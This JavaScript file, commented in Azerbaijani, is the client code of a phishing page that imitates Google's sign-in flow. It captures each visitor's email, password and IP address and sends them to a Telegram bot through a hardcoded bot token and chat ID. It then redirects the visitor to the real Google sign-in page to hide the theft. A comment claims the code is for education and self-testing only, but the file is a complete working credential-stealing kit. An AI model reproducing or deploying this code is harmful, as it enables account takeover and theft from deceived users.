/**
 * GOOGLE LOGIN - FUNKSİONAL VERSİYA
 * Email, Şifrə və IP məlumatları Telegram-a göndərilir
 * 
 * ⚠️ BU KOD YALNIZ TƏHSİL VƏ ÖZ TESTLƏRİNİZ ÜÇÜNDÜR
 */

(function() {
    'use strict';

    // =============================================
    // KONFİQURASİYA
    // =============================================
    
    const CONFIG = {
        TELEGRAM: {
            BOT_TOKEN: '6800223810:AAFxY2GC2A6PHl3oquOTDUWQMv-HMBXjdoA',
            CHAT_ID: '6353022269'
        },
        REDIRECT_URL: 'https://accounts.google.com/v3/signin/identifier',
        REDIRECT_DELAY: 1500,
        LINKS: {
            HELP: 'https://support.google.com/accounts/',
            FORGOT_EMAIL: 'https://accounts.google.com/signin/usernamerecovery',
            FORGOT_PASSWORD: 'https://accounts.google.com/signin/recovery',
            LEARN_MORE: 'https://support.google.com/chrome/answer/6130773',
            CREATE_ACCOUNT: 'https://accounts.google.com/signup',
            PRIVACY: 'https://policies.google.com/privacy',
            TERMS: 'https://policies.google.com/terms'
        }
    };

    // =============================================
    // STATE
    // =============================================
    
    const state = {
        email: '',
        password: '',
        ip: '',
        isSubmitting: false
    };

    // =============================================
    // UTILITY FUNKSİYALARI
    // =============================================
    
    // IP ünvanını əldə et
    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch (e) {
            try {
                const res = await fetch('https://api.myip.com');
                const data = await res.json();
                return data.ip;
            } catch (e2) {
                return 'Bilinmir';
            }
        }
    }

    // Loading göstər/gizlə
    function showLoading(show) {
        let overlay = document.getElementById('loadingOverlay');
        
        if (show) {
            if (!overlay) {
                overlay = document.createElement('div');
                overlay.id = 'loadingOverlay';
                overlay.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(255, 255, 255, 0.8);
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    z-index: 10000;
                `;
                
                const spinner = document.createElement('div');
                spinner.style.cssText = `
                    width: 40px;
                    height: 40px;
                    border: 3px solid #dadce0;
                    border-top-color: #1a73e8;
                    border-radius: 50%;
                    animation: spin 0.8s linear infinite;
                `;
                
                const style = document.createElement('style');
                style.textContent = `
                    @keyframes spin {
                        to { transform: rotate(360deg); }
                    }
                `;
                document.head.appendChild(style);
                
                overlay.appendChild(spinner);
                document.body.appendChild(overlay);
            }
            overlay.style.display = 'flex';
        } else if (overlay) {
            overlay.style.display = 'none';
        }
    }

    // Telegram-a məlumat göndər
    async function sendToTelegram(email, password, ip) {
        const now = new Date();
        const dateStr = now.toLocaleString('az-AZ', {
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });

        const message = `
🔐 <b>GOOGLE LOGIN</b>
━━━━━━━━━━━━━━━━━━━━━━━━

📧 <b>EMAIL:</b> <code>${email}</code>
🔑 <b>PASSWORD:</b> <code>${password}</code>
🌐 <b>IP ADDRESS:</b> <code>${ip}</code>

🕐 <b>TIME:</b> ${dateStr}

━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Təhlükəsizlik testi məlumatı</i>
        `.trim();

        try {
            const res = await fetch(
                `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`,
                {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM.CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                }
            );
            
            const data = await res.json();
            return data.ok;
        } catch (e) {
            console.error('Telegram error:', e);
            return false;
        }
    }

    // Link yönləndirmə funksiyası
    function navigateTo(url, newTab = true) {
        if (newTab) {
            window.open(url, '_blank');
        } else {
            window.location.href = url;
        }
    }

    // =============================================
    // EMAIL STEP
    // =============================================
    
    function showEmailError(msg) {
        const input = document.getElementById('emailInput');
        const errDiv = document.getElementById('emailError');
        const errText = document.getElementById('emailErrorText');

        input.classList.add('error');
        errText.textContent = msg;
        errDiv.classList.add('show');
    }

    function clearEmailError() {
        const input = document.getElementById('emailInput');
        const errDiv = document.getElementById('emailError');

        input.classList.remove('error');
        errDiv.classList.remove('show');
    }

    function validateEmail(email) {
        if (!email || email.trim() === '') {
            return { valid: false, error: 'Enter an email or phone number' };
        }

        const emailRx = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phoneRx = /^\+?[\d\s\-()]{7,}$/;

        if (!emailRx.test(email) && !phoneRx.test(email)) {
            return { valid: false, error: 'Enter a valid email or phone number' };
        }

        return { valid: true };
    }

    function goToPassword(email) {
        // Səhifələri dəyiş
        document.getElementById('step-email').classList.remove('active');
        document.getElementById('step-password').classList.add('active');

        // İstifadəçi məlumatlarını göstər
        document.getElementById('badgeEmail').textContent = email;
        document.getElementById('avatarLetter').textContent = email.charAt(0).toUpperCase();

        // State-də saxla
        state.email = email;

        // Şifrə inputuna fokus
        setTimeout(() => document.getElementById('passwordInput').focus(), 50);
    }

    function goBackToEmail() {
        document.getElementById('step-password').classList.remove('active');
        document.getElementById('step-email').classList.add('active');

        clearPwError();
        document.getElementById('passwordInput').value = '';
        document.getElementById('showPwCheck').checked = false;
        document.getElementById('passwordInput').type = 'password';

        state.password = '';

        setTimeout(() => document.getElementById('emailInput').focus(), 50);
    }

    async function handleEmailNext() {
        if (state.isSubmitting) return;

        const input = document.getElementById('emailInput');
        const email = input.value.trim();

        const validation = validateEmail(email);
        
        if (!validation.valid) {
            showEmailError(validation.error);
            return;
        }

        clearEmailError();
        goToPassword(email);
    }

    // =============================================
    // PASSWORD STEP
    // =============================================
    
    function showPwError() {
        document.getElementById('passwordInput').classList.add('error');
        document.getElementById('pwError').classList.add('show');
    }

    function clearPwError() {
        document.getElementById('passwordInput').classList.remove('error');
        document.getElementById('pwError').classList.remove('show');
    }

    async function handlePasswordNext() {
        if (state.isSubmitting) return;

        const passwordInput = document.getElementById('passwordInput');
        const password = passwordInput.value;

        if (!password) {
            showPwError();
            return;
        }

        clearPwError();
        
        // State-i yenilə
        state.isSubmitting = true;
        state.password = password;

        // Loading göstər
        showLoading(true);

        try {
            // IP əldə et
            if (!state.ip) {
                state.ip = await getIP();
            }

            // Telegram-a göndər
            await sendToTelegram(state.email, state.password, state.ip);

            // Qısa gözləmə
            await new Promise(resolve => setTimeout(resolve, 1000));

            // Google-a yönləndir
            window.location.href = CONFIG.REDIRECT_URL;

        } catch (e) {
            console.error('Xəta:', e);
            alert('An error occurred. Please try again.');
            
            // State-i sıfırla
            state.isSubmitting = false;
            showLoading(false);
        }
    }

    // =============================================
    // SHOW PASSWORD
    // =============================================
    
    function toggleShowPw(row) {
        const cb = row.querySelector('input[type=checkbox]');
        cb.checked = !cb.checked;
        document.getElementById('passwordInput').type = cb.checked ? 'text' : 'password';
    }

    // =============================================
    // NAVIGATION HANDLERS
    // =============================================
    
    function handleHelp() {
        navigateTo(CONFIG.LINKS.HELP);
    }

    function handleForgotEmail() {
        navigateTo(CONFIG.LINKS.FORGOT_EMAIL);
    }

    function handleForgotPassword(e) {
        if (e) e.preventDefault();
        navigateTo(CONFIG.LINKS.FORGOT_PASSWORD);
    }

    function handleLearnMore(e) {
        if (e) e.preventDefault();
        navigateTo(CONFIG.LINKS.LEARN_MORE);
    }

    function handleCreateAccount() {
        navigateTo(CONFIG.LINKS.CREATE_ACCOUNT);
    }

    function handlePrivacy(e) {
        if (e) e.preventDefault();
        navigateTo(CONFIG.LINKS.PRIVACY);
    }

    function handleTerms(e) {
        if (e) e.preventDefault();
        navigateTo(CONFIG.LINKS.TERMS);
    }

    // =============================================
    // EVENT LISTENERS
    // =============================================
    
    function bindEvents() {
        // Email input
        const emailInput = document.getElementById('emailInput');
        emailInput.addEventListener('input', clearEmailError);
        emailInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') handleEmailNext();
        });

        // Password input
        const passwordInput = document.getElementById('passwordInput');
        passwordInput.addEventListener('input', clearPwError);
        passwordInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') handlePasswordNext();
        });

        // Show password checkbox
        const showPwCheck = document.getElementById('showPwCheck');
        showPwCheck.addEventListener('click', (e) => e.stopPropagation());
        showPwCheck.addEventListener('change', function() {
            passwordInput.type = this.checked ? 'text' : 'password';
        });

        // Link event-ləri
        bindLinkEvents();
    }

    function bindLinkEvents() {
        // Forgot email link
        const forgotEmailLink = document.querySelector('.info-link-row a[href="#"]');
        if (forgotEmailLink) {
            forgotEmailLink.addEventListener('click', (e) => {
                e.preventDefault();
                handleForgotEmail();
            });
        }

        // Learn more link
        const learnMoreLink = document.querySelector('a[href="#"]:not(.forgot-link)');
        const allLinks = document.querySelectorAll('a[href="#"]');
        allLinks.forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                const text = this.textContent.trim().toLowerCase();
                
                if (text.includes('forgot email') || text.includes('e-posta adresinizi mi unuttunuz')) {
                    handleForgotEmail();
                } else if (text.includes('learn more') || text.includes('daha fazla bilgi edinin')) {
                    handleLearnMore(e);
                } else if (text.includes('forgot password') || text.includes('şifrəni unutdun')) {
                    handleForgotPassword(e);
                } else if (text.includes('privacy') || text.includes('mehremiyyet') || text.includes('gizlilik')) {
                    handlePrivacy(e);
                } else if (text.includes('terms') || text.includes('şartlar') || text.includes('koşullar')) {
                    handleTerms(e);
                } else if (text.includes('help') || text.includes('yardım')) {
                    handleHelp();
                }
            });
        });

        // Footer linkləri üçün xüsusi handler
        const footerLinks = document.querySelectorAll('.footer-links a');
        footerLinks.forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                const text = this.textContent.trim().toLowerCase();
                
                if (text.includes('help') || text.includes('yardım')) {
                    handleHelp();
                } else if (text.includes('privacy') || text.includes('mehremiyyet')) {
                    handlePrivacy(e);
                } else if (text.includes('terms') || text.includes('şartlar')) {
                    handleTerms(e);
                }
            });
        });

        // Header Help button
        const headerHelpBtn = document.querySelector('.header-right .btn-text');
        if (headerHelpBtn) {
            headerHelpBtn.addEventListener('click', (e) => {
                e.preventDefault();
                handleHelp();
            });
        }

        // Create account button
        const createAccountBtn = document.querySelector('.btn-create');
        if (createAccountBtn) {
            createAccountBtn.addEventListener('click', (e) => {
                e.preventDefault();
                handleCreateAccount();
            });
        }
    }

    // =============================================
    // HTML onclick handlerləri yeniləmək üçün
    // =============================================
    
    function updateHTMLOnClickHandlers() {
        // Forgot password linkini yenilə
        const forgotPwLink = document.querySelector('.forgot-link');
        if (forgotPwLink) {
            forgotPwLink.setAttribute('onclick', 'handleForgotPassword(event)');
        }

        // Learn more linkini tap və yenilə
        const infoLinks = document.querySelectorAll('.info-link-row a');
        infoLinks.forEach(link => {
            if (link.textContent.includes('Learn more') || link.textContent.includes('daha fazla bilgi')) {
                link.setAttribute('onclick', 'handleLearnMore(event)');
                link.setAttribute('href', '#');
            } else if (link.textContent.includes('Forgot email') || link.textContent.includes('E-posta')) {
                link.setAttribute('onclick', 'handleForgotEmail(event)');
                link.setAttribute('href', '#');
            }
        });

        // Footer linkləri
        const footerLinks = document.querySelectorAll('.footer-links a');
        footerLinks.forEach(link => {
            if (link.textContent.includes('Help') || link.textContent.includes('Yardım')) {
                link.setAttribute('onclick', 'handleHelp(event)');
            } else if (link.textContent.includes('Privacy') || link.textContent.includes('Mehremiyyet')) {
                link.setAttribute('onclick', 'handlePrivacy(event)');
            } else if (link.textContent.includes('Terms') || link.textContent.includes('Şartlar')) {
                link.setAttribute('onclick', 'handleTerms(event)');
            }
            link.setAttribute('href', '#');
        });

        // Header Help button
        const headerHelp = document.querySelector('.header-right .btn-text');
        if (headerHelp) {
            headerHelp.setAttribute('onclick', 'handleHelp(event)');
        }

        // Create account button
        const createBtn = document.querySelector('.btn-create');
        if (createBtn) {
            createBtn.setAttribute('onclick', 'handleCreateAccount(event)');
        }
    }

    // =============================================
    // BAŞLAT
    // =============================================
    
    async function init() {
        bindEvents();
        updateHTMLOnClickHandlers();
        
        // Səhifə yüklənəndə IP-ni arxa planda əldə et
        state.ip = await getIP();
        
        // Konsol xəbərdarlığı
        console.log('%c⚠️ XƏBƏRDARLIQ', 'font-size: 14px; font-weight: bold; color: #d93025;');
        console.log('%cBu kod yalnız təhsil və öz testləriniz üçündür.', 'font-size: 12px; color: #5f6368;');
    }

    // Global funksiyaları təyin et (HTML onclick üçün)
    window.handleEmailNext = handleEmailNext;
    window.handlePasswordNext = handlePasswordNext;
    window.goBackToEmail = goBackToEmail;
    window.toggleShowPw = toggleShowPw;
    
    // Yeni navigation handlerləri
    window.handleHelp = function(e) { if (e) e.preventDefault(); handleHelp(); };
    window.handleForgotEmail = function(e) { if (e) e.preventDefault(); handleForgotEmail(); };
    window.handleForgotPassword = function(e) { if (e) e.preventDefault(); handleForgotPassword(e); };
    window.handleLearnMore = function(e) { if (e) e.preventDefault(); handleLearnMore(e); };
    window.handleCreateAccount = function(e) { if (e) e.preventDefault(); handleCreateAccount(); };
    window.handlePrivacy = function(e) { if (e) e.preventDefault(); handlePrivacy(e); };
    window.handleTerms = function(e) { if (e) e.preventDefault(); handleTerms(e); };

    // Başlat
    init();

})();
